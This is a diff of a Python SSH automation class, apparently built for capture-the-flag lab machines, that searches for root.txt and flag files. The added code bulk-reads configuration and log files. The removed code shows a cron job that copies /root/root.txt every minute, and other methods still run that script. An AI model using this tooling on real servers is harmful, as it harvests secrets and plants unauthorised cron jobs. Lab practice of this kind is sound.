@@ -23,11 +23,51 @@ class SSHExplorer:
             return f"予期せぬエラーが発生しました: {str(e)}"
 
     async def explore_current_directory(self, host: str, port: int, username: str, password: str) -> str:
-        """リモートサーバーの現在のディレクトリの内容を調査します"""
+        """リモートサーバーの現在のディレクトリの内容を調査し、テキストファイルの内容も読み取ります"""
         async def task(conn):
             current_dir = await self._run_remote_command(conn, 'pwd')
             dir_contents = await self._run_remote_command(conn, 'ls -la')
-            return f"現在のディレクトリ: {current_dir}\n\nディレクトリの内容:\n{dir_contents}"
+            
+            # テキストファイルを検索して読み取り
+            text_files = await self._run_remote_command(conn, 'find . -maxdepth 1 -type f \\( -name "*.txt" -o -name "*.log" -o -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.json" -o -name "*.xml" -o -name "*.yaml" -o -name "*.yml" \\) 2>/dev/null')
+            
+            result = f"現在のディレクトリ: {current_dir}\n\nディレクトリの内容:\n{dir_contents}\n"
+            
+            if text_files:
+                result += "\n📄 テキストファイルの内容:\n"
+                result += "=" * 50 + "\n"
+                
+                files = text_files.split('\n')
+                for file_path in files:
+                    if not file_path:
+                        continue
+                    
+                    # ファイル名から./を除去
+                    file_name = file_path.replace('./', '')
+                    
+                    try:
+                        # ファイルサイズを確認
+                        file_size = await self._run_remote_command(conn, f'stat -c%s "{file_path}" 2>/dev/null || echo "unknown"')
+                        
+                        # ファイルサイズが1MB以下なら読み取り
+                        if file_size != "unknown" and int(file_size) <= 1048576:  # 1MB = 1048576 bytes
+                            content = await self._run_remote_command(conn, f'cat "{file_path}" 2>/dev/null || echo "読み取りエラー"')
+                            
+                            if content and content != "読み取りエラー":
+                                result += f"\n📁 ファイル: {file_name}\n"
+                                result += f"📏 サイズ: {file_size} bytes\n"
+                                result += f"📝 内容:\n{'-' * 30}\n{content}\n{'-' * 30}\n"
+                            else:
+                                result += f"\n📁 ファイル: {file_name} (読み取りエラーまたは空ファイル)\n"
+                        else:
+                            result += f"\n📁 ファイル: {file_name} (サイズが大きすぎるためスキップ: {file_size} bytes)\n"
+                            
+                    except Exception as e:
+                        result += f"\n📁 ファイル: {file_name} (エラー: {str(e)})\n"
+            else:
+                result += "\n📄 テキストファイルは見つかりませんでした。\n"
+            
+            return result
         
         return await self._execute_exploration(host, port, username, password, task)
 
@@ -119,60 +159,7 @@ class SSHExplorer:
         """リモートサーバーのflag*.txtやroot.txtファイルを網羅的に検索します"""
         return await self.search_flag_files(host, port, username, password)
 
-    async def create_cron_job_for_root_copy(self, host: str, port: int, username: str, password: str) -> str:
-        """SSH接続後、/tmp/cronjob.shにroot.txtをカレントディレクトリにコピーするcronジョブを作成します"""
-        async def task(conn):
-            try:
-                # root.txtファイルの場所を固定
-                root_file_path = "/root/root.txt"
-                
-                # ファイルの存在確認
-                file_exists = await self._run_remote_command(conn, f'test -f "{root_file_path}" && echo "exists" || echo "not found"')
-                
-                if "not found" in file_exists:
-                    return f"エラー: {root_file_path}ファイルが見つかりませんでした。"
-                
-                # /tmp/cronjob.shファイルを作成
-                cron_script_content = f"""#!/bin/bash
-# root.txtをユーザーのホームディレクトリにコピーするcronジョブ
-cp "{root_file_path}" /home/{username}/root.txt
-"""
-                
-                # スクリプトを/tmp/cronjob.shに書き込み
-                await conn.run(f'echo \'{cron_script_content}\' > /tmp/cronjob.sh')
-                
-                # 実行権限を付与
-                await self._run_remote_command(conn, 'chmod +x /tmp/cronjob.sh')
-                
-                # cronジョブを追加（毎分実行）
-                cron_job = "* * * * * /tmp/cronjob.sh"
-                await conn.run(f'echo "{cron_job}" | crontab -')
-                
-                # 作成されたファイルの内容を確認
-                script_content = await self._run_remote_command(conn, 'cat /tmp/cronjob.sh')
-                cron_list = await self._run_remote_command(conn, 'crontab -l')
-                
-                result = f"""✅ cronジョブが正常に作成されました！
 
-📁 root.txtファイルの場所: {root_file_path}
-📄 作成されたスクリプト: /tmp/cronjob.sh
-
-📋 スクリプトの内容:
-{script_content}
-
-📅 設定されたcronジョブ:
-{cron_list}
-
-🔄 このジョブは毎分実行され、root.txtをカレントディレクトリにコピーします。
-📝 実行ログは /tmp/cron_copy.log に記録されます。
-"""
-                
-                return result
-                
-            except Exception as e:
-                return f"エラー: cronジョブの作成に失敗しました。{str(e)}"
-
-        return await self._execute_exploration(host, port, username, password, task)
 
     async def execute_cron_copy_immediately(self, host: str, port: int, username: str, password: str) -> str:
         """cronジョブを即座に実行してroot.txtをコピーします"""
@@ -182,7 +169,7 @@ cp "{root_file_path}" /home/{username}/root.txt
                 script_exists = await self._run_remote_command(conn, 'test -f /tmp/cronjob.sh && echo "exists" || echo "not found"')
                 
                 if not script_exists:
-                    return "エラー: /tmp/cronjob.shが見つかりません。まずcreate_cron_job_for_root_copyを実行してください。"
+                    return "エラー: /tmp/cronjob.shが見つかりません。まずcronジョブを作成してください。"
                 
                 # スクリプトを即座に実行
                 result = await conn.run('/tmp/cronjob.sh', check=False)
@@ -208,7 +195,7 @@ cp "{root_file_path}" /home/{username}/root.txt
                 script_exists = await self._run_remote_command(conn, 'test -f /tmp/cronjob.sh && echo "exists" || echo "not found"')
                 
                 if "not found" in script_exists:
-                    return "エラー: /tmp/cronjob.shが見つかりません。まずcreate_cron_job_for_root_copyを実行してください。"
+                    return "エラー: /tmp/cronjob.shが見つかりません。まずcronジョブを作成してください。"
                 
                 # 現在のスクリプト内容を取得
                 current_content = await self._run_remote_command(conn, 'cat /tmp/cronjob.sh')
